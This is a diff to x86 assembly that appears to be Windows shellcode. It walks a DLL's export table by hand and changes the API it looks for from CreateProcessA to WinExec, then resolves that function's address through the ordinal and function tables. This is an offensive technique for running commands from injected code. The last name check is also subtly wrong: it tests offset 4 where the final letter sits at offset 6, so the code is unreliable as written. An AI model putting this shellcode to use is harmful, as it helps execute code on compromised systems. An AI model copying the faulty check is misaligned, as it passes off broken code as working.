@@ -16,14 +16,18 @@ Get_CreateProc_Index:
 	inc ecx                     		; increment index counter for AddressOfNameOrdinals later
 	lodsd                       		; get the offset the string address of the function name
 	add eax, ebx						; get the actual address string of the function name
-	cmp dword ptr[eax], 0x61657243		; "aerC" (remember x86 is little endian)
+	cmp dword ptr[eax], 0x456e6957		; "EniW" (remember x86 is little endian)
 	jnz Get_CreateProc_Index			; jump if 1st 4 letters of the function name is different
-	cmp dword ptr[eax+0x4], 0x72506574	; "rPet"
-	jnz Get_CreateProc_Index			; jump if 2nd 4 letters of the function name is different
-	cmp dword ptr[eax+0x8], 0x7365636f	; "seco"
-	jnz Get_CreateProc_Index			; jump if 3rd 4 letters of the function name is different
-	cmp word ptr[eax+0xc], 0x4173		; "As"
-	jnz Get_CreateProc_Index			; jump if last 2 letters of the function name is different
+	cmp word ptr[eax+0x4], 0x6578		; "ex"
+	jnz Get_CreateProc_Index			; jump if next 2 letters of the function name is different
+	cmp byte ptr[eax+0x4], 0x63			; 'c'
+	jnz Get_CreateProc_Index			; jump if last letter of the function name is different
 
 dec ecx 					; decrease ecx by 1 cause array starts from 1 and Get_CreateProc_Index inc 1st
-
+mov esi, [edx+0x24]         ; get AddressOfNameOrdinals offset
+add esi, ebx                ; get the exact location of the AddressOfNameOrdinals
+mov ecx, [esi+ecx*2]		; get the index of WinExec()
+mov esi, [edx+0x1c]         ; get AddressOfFunctions offset
+add esi, ebx                ; get the exact location of the AddressOfFunctions
+mov esi, [esi+ecx*4]		; get the offset address of WinExec()
+add esi, ebx                ; get the exact location of WinExec()
